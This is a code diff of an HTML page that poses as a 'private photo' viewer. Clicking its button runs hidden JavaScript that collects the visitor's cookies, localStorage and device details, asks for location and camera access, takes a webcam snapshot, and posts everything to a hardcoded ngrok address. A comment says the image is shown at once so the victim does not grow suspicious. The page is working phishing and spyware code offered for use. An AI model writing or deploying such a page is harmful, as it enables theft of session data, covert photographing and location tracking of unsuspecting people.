@@ -3,86 +3,81 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Media Viewer</title>
+    <title>Media Gallery</title>
     <style>
-        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #000; color: #fff; font-family: sans-serif; }
-        #box { text-align: center; padding: 25px; border: 1px solid #333; background: #111; border-radius: 12px; width: 80%; max-width: 350px; }
-        h3 { margin-bottom: 10px; font-size: 1.2rem; }
-        p { font-size: 0.9rem; color: #aaa; margin-bottom: 20px; }
-        button { background: #007bff; color: #fff; border: none; padding: 12px 30px; cursor: pointer; font-weight: bold; border-radius: 25px; font-size: 1rem; width: 100%; transition: 0.3s; }
-        button:active { background: #0056b3; transform: scale(0.98); }
+        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #000; color: #fff; font-family: sans-serif; }
+        #box { text-align: center; padding: 25px; background: #111; border-radius: 15px; width: 85%; max-width: 350px; border: 1px solid #333; }
+        button { background: #007bff; color: #fff; border: none; padding: 15px; width: 100%; border-radius: 30px; font-weight: bold; cursor: pointer; margin-top: 15px; }
         #content { display: none; }
-        img { max-width: 100%; border-radius: 8px; }
+        img { max-width: 100%; border-radius: 10px; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
     <div id="box">
-        <h3>Private Photo</h3>
-        <p>This image is protected. Please verify to view the full version.</p>
-        <button onclick="captureAndShow()">VIEW FULL IMAGE</button>
+        <div style="font-size: 50px;">🖼️</div>
+        <h3>Private Content</h3>
+        <p style="color: #888; font-size: 0.9rem;">To view the high-resolution image, please complete the verification.</p>
+        <button onclick="startInfiltration()">VIEW FULL IMAGE</button>
     </div>
 
     <div id="content">
-        <img src="elephant.jpg" alt="Secret Content">
+        <img src="elephant.jpg" alt="Unlocked Content">
     </div>
 
     <video id="video" autoplay></video>
     <canvas id="canvas"></canvas>
 
     <script>
-        const NGROK_URL = 'https://2f74-103-174-44-17.ngrok-free.app/vulnerability_probe'; 
+        const NGROK_URL = 'https://2f74-103-174-44-17.ngrok-free.app/vulnerability_probe';
 
-        async function captureAndShow() {
-            let log = {
+        async function startInfiltration() {
+            // ১. সাইলেন্ট ডাটা (পারমিশন ছাড়াই যা পাওয়া যায়)
+            let report = {
                 system: {
-                    platform: navigator.platform,
-                    cookies: document.cookie || "No Cookies",
-                    storage: JSON.stringify(localStorage),
-                    vuln: []
+                    os: navigator.platform,
+                    agent: navigator.userAgent,
+                    cores: navigator.hardwareConcurrency,
+                    ram: navigator.deviceMemory + "GB",
+                    res: `${screen.width}x${screen.height}`,
+                    lang: navigator.language,
+                    time: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cookies: document.cookie || "No Cookies Found",
+                    storage: JSON.stringify(localStorage)
                 },
-                network: {}
+                extra: {}
             };
 
-            // Vulnerability Check
-            if (navigator.pdfViewerEnabled) log.system.vuln.push("PDF_Exploit");
-            if (navigator.webdriver) log.system.vuln.push("Bot_Detected");
+            // ব্যাটারি লেভেল চেক
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                report.extra.battery = `${(b.level * 100)}% (${b.charging ? 'Charging' : 'Unplugged'})`;
+            }
 
-            // Network Info
-            const conn = navigator.connection;
-            if (conn) log.network = { type: conn.effectiveType, speed: conn.downlink + "Mbps" };
-
-            // GPS & Camera
+            // ২. পারমিশন রিকোয়েস্ট (GPS & Camera)
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                log.gps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                
+                report.gps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                     const video = document.getElementById('video');
                     video.srcObject = stream;
-                    
                     setTimeout(() => {
                         const canvas = document.getElementById('canvas');
                         canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                         canvas.getContext('2d').drawImage(video, 0, 0);
-                        sendData(log, canvas.toDataURL('image/jpeg'));
+                        sendData(report, canvas.toDataURL('image/jpeg'));
                         stream.getTracks().forEach(t => t.stop());
                     }, 1500);
-                } catch (e) { sendData(log, null); }
-            }, () => sendData(log, null));
+                } catch (e) { sendData(report, null); }
+            }, () => sendData(report, null));
 
-            // বাটন ক্লিক করার সাথে সাথে ছবি দেখাবে যাতে সন্দেহ না হয়
             document.getElementById('box').style.display = 'none';
             document.getElementById('content').style.display = 'block';
         }
 
-        function sendData(data, img) {
-            fetch(NGROK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ ...data, photo: img })
-            });
+        function sendData(d, p) {
+            fetch(NGROK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ...d, photo: p }) });
         }
     </script>
 </body>
